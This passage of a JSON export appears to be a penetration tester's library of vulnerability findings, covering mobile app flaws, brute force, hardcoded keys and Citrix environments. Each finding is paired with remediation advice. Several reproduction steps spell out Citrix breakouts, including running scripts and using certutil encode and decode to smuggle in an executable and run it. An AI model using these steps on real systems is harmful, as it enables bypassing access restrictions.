server-side checks of the values in addition to client-side controls.\n-- Utilize the __RESTRICT header to make code injection more challenging (compiler flags: -Wl,-sectcreate,__RESTRICT,__restrict,/dev/null ). App Store applications have been observed to utilize this technique, however it's unclear what Apple's stance on this is. Contact Apple prior to App Store submission or anticipate potential pushback during review.\n\nFor Android:\nGoogle has introduced SafetyNet APIs that could be used to detect potential security threats including rooted/modified devices, known malicious URLs, malware, and malicious traffic. As part of Google Play Services, SafetyNet helps a developer assess the health and safety of the devices upon which their app is installed. If an app uses the Attestation API check, for example, it won’t run on a rooted device or on a device that uses a modified OS. Google created the SafetyNet Attestation API to protect users from malware that monitors, or “spies on” mobile banking apps or payment apps such as Android Pay. For more details on Google SafetyNet Attestation API, please visit https://developer.android.com/training/safetynet/attestation","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-20 11:26:14","updated_at":"2019-01-16 06:06:51","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":"","likelihood_text":""},{"id":821,"plugin_id":null,"title":"Automated Account Creation","type":"PT","description":"The application back-end APIs allow an anonymous attacker to create fake user accounts in bulk using widely available tools. The accounts can be subsequently misused for spreading malware, consuming bandwidth and storage space, affecting reputation, and causing mischief.\nAn anonymous attacker can automate account creation process as user data associated with account is not verified by the application. An attacker can use this vulnerability to create fake accounts in bulk and use to it consume bandwidth, storage space and ultimately consuming high volume of available storage, resulting in abuse of this service.","poc":"","impact":"","remediation":"Consider following remediation to protect against automatic account creation threats.\n-- Consider limiting the functionality and/or capacity available to newly, and/or recently created, accounts.\n-- Document acceptable use of all possible account creation functions; define additional requirements.\n-- Define test cases for Account Creation that confirm the application will detect and/or prevent users attempting to create accounts in bulk.\n-- Consider randomizing the content and URLs of account creation form pages, tying these changes to the individual user’s session, verifying the changes at each request, and restricting any identified automated usage.\n-- Consider identifying and restricting automated usage by fingerprinting the User Agent for its unique characteristics.\n-- Limit the rate of creation of accounts.\n-- Log application usage by function for each user; monitor rate of application use relative to typical usage. Log account creation dates/times; monitor period from time of account creation to first use, and also monitor completeness of optional account information, and whether any profile text or images are generic, re-used or copied from elsewhere.\n-- Consider blocking or delaying access or delaying access by users in a particular session, IP address/range or geolocation.\n-- Define T&Cs to explicitly define acceptable use. Define service limits for any account creation APIs.\n-- Define actions to be taken in the event an Account Creation attack is detected.\n-- Always verify that email and mobile number entered by the user are owned by him before creating and provisioning any service. Emails can be confirmed by sending a confirmation link to the registered email. When confirmation link is clicked by the user within a certain time period only then email should be declared verified. \nFor mobile number verification an OTP can be sent to the registered mobile and verified. Once user enters OTP within a certain time period only then a user account is marked as verified and activated. No service should be provisioned to user without verification of registered email and mobile number.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-20 11:32:32","updated_at":"2019-01-14 06:37:24","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":822,"plugin_id":null,"title":"Insecure configuration of Application Transport Security in Info.plist (iOS)","type":"VA","description":"Exceptions are set in the application's declarative Application Transport Security (ATS) configuration that may enable insecure network communications. We found that the Application Transport Security (ATS) is disabled on the domain by setting '{'NSAllowsArbitraryLoads': True}'. Disabling ATS can allow insecure communication with particular servers or allow insecure loads for web views or for media, while maintaining ATS protections elsewhere in your pp.\nApplication Transport Security (ATS) was introduced by Apple in iOS 9 as a built-in utility for protecting network communications. Out of the box, ATS enforces a TLS configuration with the following criteria: -- Apps can only connect to servers using the TLS 1.2 protocol -- Apps can only connect to servers which provide strong ciphers (strong ciphers are described as AES128+ and SHA2+)  -- Apps must connect to servers using Perfect Forward Secrecy (PFS) (note: Apple has stated that they'll allow exceptions for this, for now)","poc":"","impact":"","remediation":"To enforce ATS, the AllowArbitraryLoads must be set to No under App Transport Security Settings. ATS must be enabled globally and opt-out for certain domains, if necessary, could be configured in NSExceptionDomains section -- The recommendation is to fully comply with ATS requirements and no exceptions should be configured in NSExceptionDomains to achieve associated security benefits of ATS.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-20 13:54:23","updated_at":"2018-12-21 10:35:47","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":"-- 1.\tInstall the application on the jailbroken device.\n-- 2.\tSSH to the device and browse to the application bundle folder by using the following command:\ncd /var/containers/Bundle/Application/ ; cd `find ./ -name \"<App Name>*\"  | head -n1 | cut -d\"/\" -f2 `; cd <AppName.app>\n-- 3.\tConvert the Info.plist to xml using the following command.\nplutil convert -xml1 Info.plist\n-- 4.\tObserve that  ATS settings are insecure by searching for “NSAppTransportSecurity” in Info.plist file.","likelihood_text":""},{"id":823,"plugin_id":null,"title":"Broadcast Receiver is not protected (Android)","type":"PT","description":"The Android application exports broadcast receivers which are not protected by proper permissions in the Androidmanifest.xml file.  A broadcast receiver is an Android component which allows an application to respond to a system-wide or an application specific event. \n\nThe malicious applications on the device could potentially send the intent messages to trigger the exported broadcast receivers which can result in unintended action being performed by the victim application. For example, if there is the broadcast receiver to send an SMS message on a particular event and proper permissions do not protect it, a malicious application could trigger it to send SMS to a number with the content, it’s not supposed to send. In this case, the malicious application doesn’t need SEND_SMS permission since it uses the permission registered by the victim application.","poc":"","impact":"","remediation":"Sensitive receivers must be protected by using signature level permission so that the applications that are signed with the same key would be able to send the intent messages to the receivers. Below is an example of enforcing signature level permission in the AndroidManifest.xml file.\n<pre><permission android:name=\"<Broadcast Receiver>.permission.<Permission required>\" android:protectionLevel=\"signature\" /></pre>","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-12-21 14:31:08","updated_at":"2019-01-24 02:54:07","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":"","likelihood_text":""},{"id":824,"plugin_id":null,"title":"Back-end API Vulnerable to Brute Force Attacks (Multiple Instances)","type":"PT","description":"The back-end APIs are vulnerable to multiple instances of brute force attacks.  The back-end APIs do not implement any checks to limit the number or speed of sensitive requests for a given user, allowing attackers to guess valid credentials through manual or automated brute force guessing. \nThe amount of time needed to guess a valid set of credentials would depend on several factors such as the complexity of the victims' passwords and the attacker's ability to identify valid usernames.\nTo perform a brute force attack, an attacker can leverage a tool to generate sensitive requests such as authentication or password reset attempts for a known user (or list of known users). This could be achieved with a large dictionary of pre-defined passwords, a string-generating algorithm (for password reset code), or a combination.  The tool would eventually succeed in generating a correct request, giving the attacker the account access for the given user.","poc":"","impact":"","remediation":"The application must deter repeated guessing through a combination of slowing down the attack and logging the failures. When choosing to implement mechanisms to accomplish this, it is important to consider the impact it will have on a victim as well as an attacker. Overly stringent techniques and thresholds, such as permanently locking a user out after a relatively low number of invalid login attempts, can lead to an attacker intentionally locking out victims. Provided the attacker has a list of all usernames that are currently valid in the application, such a Denial of Service could impact all legitimate users of the application. \nTechniques that can be adopted by the application include temporarily locking out a user after a specific number of failed login attempts, leveraging CAPTCHA or other challenges to ensure login submissions cannot be automated, monitoring the velocity of login attempts and purposefully responding slowly when a client appears to be re-submitting credentials too quickly, and permanently locking out a user. In the latter case, unlocking the account should require an out-of-band mechanism (e.g. calling a helpdesk). The above techniques can also be combined to provide a legitimate user a reasonable number of attempts to log in, while making automated attacks infeasible. \nIrrespective of what mechanisms are employed to prevent brute force attacks, the application should always log failures. These should be monitored as security events by the operations team that operates the security information and event management (SIEM) tool.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-14 06:30:15","updated_at":"2019-01-24 03:10:42","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":825,"plugin_id":null,"title":"Lack of Binary Obfuscation (Android) (iOS)","type":"PT","description":"The application does not enforce code obfuscation. This can result in reverse engineering of the applications. Without binary obfuscation, an attacker can easily disassemble and decompile the binary file of the application and understand the resulting code. Through various reverse engineering techniques, an attacker can figure out a lot of information about an application, including, but not limited to: logical flaws, intellectual property, hard coded secrets (cryptographic keys, passwords, internal IP addresses), and privileged functions. Knowledge of the application internals can facilitate the process of bypassing application controls and the development of other attacks.","poc":"","impact":"","remediation":"Applications handling sensitive data, performing financial transactions or containing unique IP should consider introducing binary obfuscation where appropriate, in order to make reverse-engineering harder for attackers. \nFor Android, the open-source ProGuard tool performs a degree of symbol renaming, however this may not be adequate binary obfuscation. ProGuard is used by default during an Android's application compilation toolchain for production binaries. There are several commercial products available for obfuscating Android applications, including their native libraries. Each of these products should be independently configured and assessed, as each applies different obfuscation controls. As C/C++ obfuscation is inherently more robust than Java obfuscation, it might be worth considering implementing sensitive operations such as cryptography, root detection, and certificate pinning using the NDK before applying obfuscation.\n\nFor iOS, Objective-C and Swift code is not obfuscated by default during the compilation, it is however stripped to a degree, limiting the number of available symbols in the resulting binary. More thorough obfuscation can be achieved by using one of several open-source and commercial products are available for iOS applications. Each of these products should be independently configured and assessed, as each applies different obfuscation controls. As native code obfuscation is inherently more robust than Objective-C obfuscation, it might be worth considering implementing sensitive operations such as cryptography, root detection, and certificate pinning using C/C++ before applying obfuscation.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-14 07:03:37","updated_at":"2019-01-24 02:55:44","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":"","likelihood_text":""},{"id":826,"plugin_id":null,"title":"Improper Export of Android Application Components","type":"PT","description":"The Android application exports several components for use by other applications, but does not properly restrict which applications can launch the component or access the data it contains. It exports many broadcast receivers and activities which are not protected by proper permissions in the Androidmanifest.xml file, making them vulnerable to triggers created by intents of the other applications.\nThe attacks and consequences of improperly exporting a component may depend on the exported component:\n-- If access to an exported Activity is not restricted, any application would be able to launch the activity. This may allow a malicious application to gain access to the sensitive information, modify the internal state of the application, or trick a user into interacting with the victim application while believing they are still interacting with the malicious application.\n-- If access to an exported Service is not restricted, any application may start and bind to the Service. Depending on the exposed functionality, this may allow a malicious application to perform unauthorized actions, gain access to sensitive information, or corrupt the internal state of the application.\n-- If access to a Content Provider is not restricted to only the expected applications, then the malicious applications might be able to access the sensitive data. Note that in Android before 4.2, the Content Provider is automatically exported unless it has been explicitly declared as NOT exported.","poc":"","impact":"","remediation":"Activities:\nReview the list of activities and export the needed ones only and set the android.exported=”false” for others as shown below.\n<pre><activity android:theme=\"<Theme>\" android:label=\"<Label>\" android:name=\"<Activity Name>\" android:exported=\"false\">\n     <intent-filter>\n\n     </intent-filter>\n</activity><pre>\nIf an activity needs to be exported, consider setting a permission on the activity in the Manifest file.\n<pre><activity android:name=\"<Activity Name>\" android:permission=\"<Permission Name>\">\n    <intent-filter>\n    ...\n    </intent-filter>\n</activity><pre>\nIf an application wanted to start this Activity, it would do so by creating an Intent specifying the desire to start the Activity and then call either Context.startActivity() or Activity.startActivityForResult(). If the caller has the specified permission, both of these calls will succeed, resulting in the Activity being started. Without that permission, both will fail and throw a SecurityException.\n\nBroadcast Receiver:\nThis vulnerability can be mitigated by using signature level permission. In this case, only applications that are signed with the same key will be able to obtain this permission.\n        <pre><receiver android:name=\"<Broadcast Receiver>\" android:enabled=\"true\">\n            <intent-filter>\n                <action android:name=\"<Action Name>\" />\n            </intent-filter>\n        </receiver><pre>\nAbove mentioned broadcast receiver can be secured by adding the following permissions in the Androidmanifest.xml file.\n<pre><permission android:name=\"<Broadcast Receiver>.permission.<Permission required>\" android:protectionLevel=\"signature\" /><pre>","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-16 06:27:45","updated_at":"2019-01-24 03:14:47","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":"1.\tOpen the AndroidManifest.xml file; find the activity and receiver declaration for one of the Instances mentioned in Instances section.\n2.\tThere is no permission defined for the defined component.","likelihood_text":""},{"id":827,"plugin_id":null,"title":"Input Returned in Response (Stored)","type":"PT","description":"Retrieval of stored input arises when user input is stored and later embedded into the application's responses. Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses.\r\nVulnerabilities resulting from retrieval of stored input are typically more serious than the equivalent reflected vulnerabilities because they do not require a separate delivery mechanism in order to reach target users.","poc":null,"impact":null,"remediation":"In general, effectively prevent any harm from input returned in response(stored) involves a combination of the following measures:\r\n-- At the point where user input is received, filter as strictly as possible based on what is expected or valid input.\r\n-- At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.\r\n-- To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.\r\nAs a last line of defence, you can use the Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-16 06:59:56","updated_at":"2019-01-16 06:59:56","approved":0,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":828,"plugin_id":null,"title":"Automatic Reference Counting (ARC) not enabled (IOS)","type":"PT","description":"The application was compiled with automatic reference counting (\"ARC\") disabled, indicating that the application must perform manual reference counting. Manual reference counting is a memory-management technique that is prone to error since the responsibility of retaining or releasing objects falls on the developer. ARC shifts the responsibility of memory management from the developer to the compiler, ensuring that objects live as long as necessary, but no longer. Without it, developers must insert explicit retain and release messages, which must be properly paired and ordered to prevent memory leaks, use-after-free vulnerabilities, and double-free vulnerabilities.","poc":null,"impact":null,"remediation":"ARC is supported and should be enabled during compilation in Xcode 4.2 and above, for iOS 4 and above, and OS X 10.6 and above. Applications should be recompiled using a version of Xcode that supports ARC using one of the following techniques: For new applications, use Xcode's default settings that enable ARC through the use of the -fobjc-arc compiler flag. For existing applications, use Xcode's ARC refactoring tool by choosing \"Edit > Refactor > Convert to Objective-C ARC\" from the menu bar. The specific refactoring process is outside the scope of this report, but is described in Apple's \"Transitioning to ARC Release Notes\" document: https://developer.apple.com/library/ios/releasenotes/objectivec/rn-transitioningtoarc/Introduction/Introduction.html","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-16 07:03:31","updated_at":"2019-01-16 07:03:31","approved":0,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":829,"plugin_id":null,"title":"Unrestricted PowerShell Access [Citrix]","type":"VA","description":"In the Citrix environment, it is possible for a user to break out of the enforced restrictions and execute arbitrary commands by opening the PowerShell directly. As a result, the user can effectively use PowerShell to attempt and automate further attacks, such as enumeration and exploitation of vulnerable local services and local/network resources","poc":"","impact":"","remediation":"It is recommended to prevent access to all the tools and utilities that an attacker could use to access the operating system and/or other applications hosted on the same server. Typically, Task Manager, Remote Desktop, Command shell, and PowerShell are restricted. Access to any other system utilities (such as Wscript) that are not needed for a normal use case must be restricted. For example, there are many executables under the Windows System32 folder that could be abused by the attacker.\n\nAccess restrictions could be enforced using standard methods such as Group Policies, Software Restrictions using AppLocker, NTFS permissions or by using various 3rd party tools.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:03:03","updated_at":"2019-01-24 02:22:47","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"Use any of the methods presented in below to breakout and then follow the steps mentioned below:\n\n-- 1. Browse to the location of PowerShell i.e. <pre>\\\\127.0.0.1\\c$\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</pre>\n-- 2. The permission dialog box will open, Click run \n-- 3. Observe that PowerShell is opened\n\nMethod 1:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, Click on File menu-> Open\n3.\tClick on Browse\n4.\tSet a path to \\\\127.0.0.1\\c$\n5.\tObserve that the C directory is accessible\nMethod 2:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, Click on File menu-> Import and Export\n3.\tSelect Import from a file and click Next\n4.\tClick on browse and set a path to \\\\127.0.0.1\\c$\n5.\tObserve that the C directory is accessible\nMethod 3:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, write \\\\127.0.0.1\\c$ in URL\n3.\tThe explorer window will open\n4.\tObserve that C directory is accessible\nMethod 4:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, Click on Settings-> Internet Options\n3.\tGo to Content->Certificates\n4.\tClick on Import->Next->Browse\n5.\tSet a path to \\\\127.0.0.1\\c$\n6.\tObserve that the C directory is accessible\nMethod 5:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, Click on Settings-> Internet Options\n3.\tGo to Programs->Set programs\n4.\tSet a path to \\\\127.0.0.1\\c$\n5.\tObserve that the C directory is accessible\nMethod 6:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, Click on Settings-> Internet Options\n3.\tGo to Privacy->Import\n4.\tSet a path to \\\\127.0.0.1\\c$\n5.\tObserve that the C directory is accessible\nMethod 7:\n1.\tDownload the Launch.ica file and open the Internet Explorer\n2.\tIn the Internet Explorer, press Shift key five times\n3.\tPop up for Sticky Keys will open, click on Go to the Ease of Access Center to disable the keyboard shortcut\n4.\tSet a path to \\\\127.0.0.1\\c$\n5.\tObserve that the C directory is accessible","likelihood_text":""},{"id":830,"plugin_id":null,"title":"Unrestricted Script Execution [Citrix]","type":"VA","description":"In the Citrix environment, it is possible for a user to run .bat, .ps1 and .vbs scripts. As a result, the user can use scripting techniques to execute arbitrary commands, and attempt to automate further attacks, such as enumeration and exploitation of vulnerable local services and local/network resources. This effectively bypasses restrictions placed on command prompt access.","poc":"","impact":"","remediation":"Use Group Policy settings to prevent the user from executing Windows PowerShell scripts and Batch scripts. To disable other types of scripts such as vbs, js, and wse etcetera, Wscript.exe (under Windows/System32) must be disabled via Group Policies, AppLocker, NTFS permissions or by using various 3rd party tools.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:04:45","updated_at":"2019-01-24 02:23:31","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"--1.\tCreate a “.bat” script with the following code in notepad and save it as “script.bat”\n<pre>start powershell -noexit -command \"mkdir \\\\127.0.0.1\\c$\\Temp\\Test1\"</pre>\n\n--2.\tDouble click on the script\n--3.\tThe permission dialog box will open, Click run \n--4.\tObserve that PowerShell Script has been executed and the directory in Temp folder has been created","likelihood_text":""},{"id":831,"plugin_id":null,"title":"Unrestricted File System Directory Access [Citrix]","type":"VA","description":"In the Citrix environment, there are multiple ways for a user to access and navigate the system directories (E.g., C:\\Windows\\System32), and the network shared directories on the server. As a result, the user can navigate through the directory structure allowing him/her to view installed files and applications, open and read files etcetera. This effectively bypasses any existing group policy restrictions placed regarding file system access","poc":"","impact":"","remediation":"It is recommended to prevent access to all the tools and utilities that an attacker could use to access the operating system and/or other applications hosted on the same server. Typically, Task Manager, Remote Desktop, Command shell, and PowerShell are restricted. Access to any other system utilities (such as Wscript) that are not needed for a normal use case must be restricted. For example, there are many executables under the Windows System32 folder that could be abused by the attacker.\n\nAccess restrictions could be enforced using standard methods such as Group Policies, Software Restrictions using AppLocker, NTFS permissions or by using various 3rd party tools.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:06:45","updated_at":"2019-01-24 02:14:13","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"-- 1.\tDownload launch.ica file and open Internet Explorer\n-- 2.\tIn Internet Explorer, click on file->open\n-- 3.\tClick on browse \n-- 4.\tSet the path to \\\\127.0.0.1\\c$\n--5.\tObserve that the C directory is accessible","likelihood_text":""},{"id":832,"plugin_id":null,"title":"Sensitive Information Disclosure [Citrix]","type":"VA","description":"During the testing, we found that sensitive information is stored on the network share and the Citrix users have read access to such information. This includes sensitive documents and the Active Directory credentials for the internally hosted applications. As explained in section <insert reference here>, there are multiple ways for a user to access and navigate system or network shared directories on the server. \n\nAs a result, the user can browse through the server directory structure, allowing him/her to view sensitive files and applications configurations, etc. This effectively bypasses any existing group policy restrictions placed regarding file system access.","poc":"","impact":"","remediation":"One of the methods an attacker uses to escalate privileges is by finding a clear-text file with the credentials. This could either be on the local computer or remote shares that do not require authentication. If there are no use cases for the user to have access to the shared files and folders, the Citrix users should be restricted from accessing any shared drives. It is highly recommended to provide access to sensitive information on need to know principle.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:10:43","updated_at":"2019-01-24 02:22:06","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"Use any of the methods presented in Appendix A to breakout and then follow the steps mentioned below:\n\n--1.\tClick on Network shares\n--2.\tObserve that you can browse and read network shared files and folders","likelihood_text":""},{"id":833,"plugin_id":null,"title":"Unauthorized Executable Allowed [Citrix]","type":"VA","description":"During testing, we found that the users could execute unauthorized executable within the Citrix environment by installation or copying the unauthorized programs on the remote host.","poc":null,"impact":null,"remediation":"Use Windows software restriction policies to prevent the user from running unauthorized applications. This can be achieved by whitelisting a certain number of binaries required for the standard use case. Alternatively, the restriction policy could be configured to allow any executable to run that is signed by a specific set of security certificates.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:13:56","updated_at":"2019-01-24 02:14:11","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":"Use any of the methods presented in Appendix A to breakout and then follow the steps mentioned below:\r\n\r\n--1.\tCreate the Hex encoded string for the exe on your local system using the command “certutil –encodehex .\\app.exe text.txt”\r\n--2.\tOpen the notepad on the target system\r\n--3.\tCopy the Hex encoded string to the newly opened notepad on the remote server\r\n--4.\tSave the file\r\n--5.\tIn the PowerShell type “certutil –decodehex .\\text.txt app.exe; .\\app.exe”\r\n--6.\tObserve that the application will be decoded and executed","likelihood_text":null},{"id":834,"plugin_id":null,"title":"Access to Internet Options [Citrix]","type":"VA","description":"In the Citrix environment it is possible for a user to access internet options from the Internet Explorer. Accessing internet options allows a user to change which domains are trusted, lower the security level of the browser, enable unsafe script execution and proxy traffic through a third party","poc":null,"impact":null,"remediation":"It is recommended to prevent users and applications from accessing internet options by disabling it. This can be achieved using group policy for the Internet Explorer by setting right configurations for the Internet Control Panel.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:17:07","updated_at":"2019-01-24 02:17:12","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":"--1.\tDownload Launch.ica file and open Internet Explorer\r\n--2.\tClick on settings button and open internet options","likelihood_text":null},{"id":835,"plugin_id":null,"title":"Access to Miscellaneous Applications on the Server [Citrix]","type":"VA","description":"A user can access miscellaneous applications on the Citrix server which are not part of the environment. Using a task manager, a user can access default available applications on the Citrix Server. Examples of such applications include notepad , calculator etc. Apart from the fact that accesses to these applications are not authorized, they may also create more avenues for exploitation through functionalities such as drafting bat files and/or vb scripts for automated attacks.","poc":null,"impact":null,"remediation":"It is recommended to prevent access to all the tools and utilities that an attacker could use to access the operating system and/or other applications hosted on the same server. Typically, Task Manager, Remote Desktop, Command shell, and PowerShell are restricted. Access to any other system utilities (such as Wscript) that are not needed for a normal use case must be restricted. For example, there are many executables under the Windows System32 folder that could be abused by the attacker.\r\n\r\nAccess restrictions could be enforced using standard methods such as Group Policies, Software Restrictions using AppLocker, NTFS permissions or by using various 3rd party tools.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-01-24 02:19:33","updated_at":"2019-01-24 02:19:38","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":"Use any of the methods presented in Appendix A to breakout and then follow the steps mentioned below:\r\n\r\n--1.\tWrite a .bat script containing the following code\r\n<pre>@echo off\r\necho Opening Calc.exe\r\n\\\\127.0.0.1\\c$\\Windows\\system32\\calc.exe</pre>\r\n--2.\tSave the script \r\n--3.\tRun the script directly by double clicking or using PowerShell\r\n--4.\tObserve that the exe file has been executed","likelihood_text":null},{"id":997,"plugin_id":null,"title":"Multiple Hardcoded Cryptographic Keys were found","type":"VA","description":"The application and the supported DLLs hardcode multiple cryptographic keys in the code. Hard-coded secrets in the client-side are accessible by anyone with access to the application, including an attacker. An attacker can quickly obtain a hard-coded secret by decompiling the application source. Since the secret is revealed in the client-side code, an attacker does not need access to the code repository as typically required by server-side code. Moreover, the attacker could simply import the DLL into their code and perform the cryptographic operations without the need to decompile the code.","poc":"","impact":"This risk can cause reputational damage to ______. For example, news stories about public exposure of the hardcoded credentials could damage customer trust in the _________ brand.\n\nOr \nThis risk can cause unauthorized sensitive data exposure which might lead to financial loss and reputational damage.","remediation":"[REVIEW] Instead of encrypting the data/files locally using the hardcoded cryptographic keys, a new set of keys must be generated upon software installation or first-time use. To protect local resources such as files, Windows Data Protection APIs (DPAPI) should be used.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-05-06 17:37:31","updated_at":"2019-05-06 17:39:10","approved":1,"v_likelihood":"Critical","v_impact":"Medium","steps_to_reproduce":"--1. Use dnSPY to decompile the above listed DLLs:\n--2. Create a C#.net Project and add the ACController.DLL as a reference file.","likelihood_text":"An attacker could use readily available tools to decompile the binaries and the extract the cryptographic keys or user credentials. The attacker could also import the DLLs into the custom code to decrypt and encrypt the necessary files and strings."},{"id":1103,"plugin_id":null,"title":"Self-Signed X.509 Certificate (SSL/TLS)","type":"PT","description":"The server issues self-signed X.509 certificates when establishing an encrypted connection with the client. Self-signed X.509 certificates are certificates that are not generated by a trusted internal or third-party certificate authority.\r\n\r\nCertificates not generated by a trusted internal or third-party authority will be rejected by most modern web browsers and generate an error which is then displayed to the user. These certificates create error complacency in users, increasing the chance they can fall prey to a Man-in-the-Middle attack. An attacker could replace the original self-signed X.509 certificate with a malicious X.509 certificate, allowing them to decrypt the user's traffic. This would lead to sensitive information exposure as well as the ability for the attacker to tamper with requests and responses, giving them full control of user requests submitted to the application or service.","poc":null,"impact":null,"remediation":"All services using self-signed X.509 certificates must acquire a new trusted certificate from a trusted certificate authority.\r\nIn general, the following best practices should be followed with respect to X.509 certificates:\r\n1.\tObtain certificates from reliable CAs such as VeriSign, GoDaddy, Thawte, etc.\r\n2.\tEnsure that the entire certificate chain is valid prior to deployment.\r\n3.\tAt a minimum use a 2048 bit private key, and protect them adequately (e.g. via strong passwords).\r\n4.\tIn case of a compromise, revoke old certificates and generate new keys to be used with the new certificates.\r\n5.\tOnly use secure HTTPS protocols (TLSv1.2) and secure cipher suites that provide authentication and encryption of 128 bits or stronger.\r\n6.\tClient initiated renegotiation should be disabled.\r\n7.\tDownload the Certificate Revocation List (CRL) from your CA at regular intervals (once a week if possible) to ensure up-to-date information regarding revoked certificates is available.\r\n8.\tEnsure that the signing certificates have been verified against the Certificate Revocation List (CRL).\r\n9.\tCertificate management tools should be leveraged to automate the discovery and monitoring of all certificates especially in large organizations.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2019-10-28 03:11:59","updated_at":"2019-10-28 